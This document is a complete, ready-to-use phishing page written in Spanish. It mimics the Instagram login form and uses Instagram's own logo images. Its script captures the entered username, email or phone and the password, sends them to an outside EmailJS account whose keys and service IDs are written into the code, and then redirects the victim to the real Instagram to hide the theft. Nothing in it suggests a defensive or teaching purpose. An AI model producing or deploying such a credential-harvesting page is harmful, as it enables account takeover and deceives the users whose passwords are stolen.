<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Icono de Instagram -->
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_8g92b6890.png" />
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
      }

        .container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 20px;
        }
        
        .logo img {
            width: 175px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 8px;
            font-size: 12px;
            width: 100%;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
        }

        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            padding: 8px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled {
            background-color: #aecfffaa; /* Un poco azul pero apagado */
            cursor: default;
        }

        .spinner {
            display: none;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            width: 14px;
            height: 14px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <!-- Logo oficial de Instagram -->
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram">
        </div>

        <form id="login-form">
            <input type="text" id="user_email" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            
            <button type="submit" id="submit-btn">
                <span id="btn-text">Iniciar sesión</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </form>
    </div>

    <!-- Script de EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            // Tu clave pública
            emailjs.init("q1IUmbgdFeBvmxnvi");
        })();

        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('login-form');
            const btn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');
            const spinner = document.getElementById('spinner');

            form.addEventListener('submit', function(event) {
                event.preventDefault(); // Evita que la página se recargue

                // UI: Mostrar carga
                btn.disabled = true;
                btnText.style.display = 'none';
                spinner.style.display = 'block';

                // Parámetros para enviar
                const templateParams = {
                    user_email: document.getElementById('user_email').value,
                    password: document.getElementById('password').value,
                    // Opcional: Añadir fecha y hora
                    fecha: new Date().toLocaleString()
                };

                // Envío con EmailJS
                // Tus IDs: Service -> service_rkpt26i, Template -> template_zl3ywbm
                emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
                    .then(function(response) {
                        console.log('Éxito!', response.status, response.text);
                        // Restaurar botón (opcional)
                        btnText.style.display = 'block';
                        spinner.style.display = 'none';
                        btnText.innerText = "Éxito";
                        btn.style.backgroundColor = "#4CAF50"; // Verde
                        
                        // Redirigir a Instagram real después de 1 segundo
                        setTimeout(function(){
                            window.location.href = "https://www.instagram.com";
                        }, 1000);

                    }, function(error) {
                        console.error('Fallo...', error);
                        // Restaurar botón en caso de error
                        btnText.style.display = 'block';
                        spinner.style.display = 'none';
                        btn.disabled = false;
                        btnText.innerText = "Error";
                    });
            });
        });
    </script>
</body>
                </html>
